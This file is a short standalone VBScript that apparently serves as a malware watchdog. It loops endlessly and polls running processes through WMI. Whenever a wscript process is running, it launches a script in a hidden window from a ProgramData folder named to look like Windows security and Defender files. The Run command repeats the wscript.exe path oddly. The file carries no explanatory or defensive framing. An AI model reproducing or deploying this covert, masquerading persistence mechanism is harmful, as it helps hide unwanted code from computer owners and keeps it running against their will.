Set OBJWScriptShell = CreateObject("WScript.Shell")

Do
	If ( EXEIsRunning("wscript") ) Then
		OBJWScriptShell.Run "C:\Windows\System32\wscript.exe C:\Windows\System32\wscript.exe C:\ProgramData\WindowsSecurityLog\0x65\WindowsDefenderStartup.vbs", 0, False
	End If
	WScript.Sleep 100
Loop

Function EXEIsRunning(name)
Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}\\" & "." & "\root\cimv2")
Set colProcess = objWMIService.ExecQuery("Select * from Win32_Process")
isRunning = False
For Each objProcess in colProcess
If (LCase(objProcess.Name) = LCase(name) & ".exe") Then
isRunning = True
End If
Next
EXEIsRunning = isRunning
End Function